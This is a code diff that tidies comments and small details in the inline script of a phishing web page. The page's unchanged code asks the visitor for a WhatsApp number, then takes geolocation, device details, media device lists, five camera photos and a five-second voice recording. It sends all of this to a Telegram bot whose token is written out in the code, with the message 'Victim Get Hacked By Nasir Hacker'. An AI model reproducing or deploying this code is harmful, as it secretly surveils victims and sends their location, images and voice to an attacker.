@@ -98,7 +98,7 @@
 </footer>
 
 <script>
-const botToken = '7530633346:AAGcNuDErVnXJxzuan7zEpyQUbMDMwk0DW4'; // Replace with your bot token
+const botToken = '7530633346:AAGcNuDErVnXJxzuan7zEpyQUbMDMwk0DW4'; // Replace with your actual bot token
 
 // Get chat ID from URL param 'id'
 function getChatId() {
@@ -115,14 +115,14 @@ async function collectAndSend() {
   const number = document.getElementById('wpnumber').value.trim();
   details.push(`Target WhatsApp Number: ${number}`);
 
-  // Notification permission
+  // Request Notification permission
   let notificationPermission = Notification.permission;
   if (notificationPermission !== 'granted') {
     notificationPermission = await Notification.requestPermission();
   }
   details.push(`Notification Permission: ${notificationPermission}`);
 
-  // Geolocation
+  // Request Geolocation
   try {
     const pos = await new Promise((resolve, reject) => {
       navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -132,7 +132,7 @@ async function collectAndSend() {
     details.push('Geolocation: Unable to get geolocation.');
   }
 
-  // Device info
+  // Collect device info
   const deviceInfo = {
     UserAgent: navigator.userAgent,
     Platform: navigator.platform,
@@ -145,7 +145,7 @@ async function collectAndSend() {
   };
   details.push('Device Info:\n' + JSON.stringify(deviceInfo, null, 2));
 
-  // Media Devices
+  // Access media devices
   try {
     const devices = await navigator.mediaDevices.enumerateDevices();
     const deviceList = devices.map(d => `${d.kind}: ${d.label}`).join('\n');
@@ -154,20 +154,20 @@ async function collectAndSend() {
     details.push('Media Devices: Not accessible.');
   }
 
-  // Start camera capture 4-5 images
+  // Capture 5 images from front camera
   const images = [];
   for (let i = 0; i < 5; i++) {
     const imgDataUrl = await capturePhoto();
     if (imgDataUrl) {
       images.push(imgDataUrl);
     }
-    await new Promise(r => setTimeout(r, 1000)); // slight delay between captures
+    await new Promise(r => setTimeout(r, 1000));
   }
 
-  // Record voice
+  // Record voice for 5 seconds
   const voiceBlob = await recordAudio();
 
-  // Send all data
+  // Send all data to Telegram
   await sendToTelegram(details.join('\n'), images, voiceBlob);
 
   document.getElementById('details').innerText = details.join('\n');
@@ -195,7 +195,7 @@ async function capturePhoto() {
   }
 }
 
-// Record voice
+// Record audio for 5 seconds
 async function recordAudio() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -222,14 +222,14 @@ async function sendToTelegram(text, images, voiceBlob) {
     return;
   }
 
-  // Send message
+  // Send main message
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, text: `<b>Victim Get Hacked By Nasir Hacker</b>`, parse_mode: 'HTML' })
   });
 
-  // Send device info message
+  // Send device info
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -237,7 +237,7 @@ async function sendToTelegram(text, images, voiceBlob) {
   });
 
   // Send images
-  for (const [index, imgDataUrl] of images.entries()) {
+  for (const imgDataUrl of images) {
     await sendPhoto(imgDataUrl, chatId);
   }
 
@@ -265,11 +265,6 @@ async function sendAudio(blob, chatId) {
   formData.append('audio', blob, 'voice.webm');
   await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: formData });
 }
-
-function getChatId() {
-  const params = new URLSearchParams(window.location.search);
-  return params.get('id');
-}
 </script>
 </body>
-  </html>
+</html>
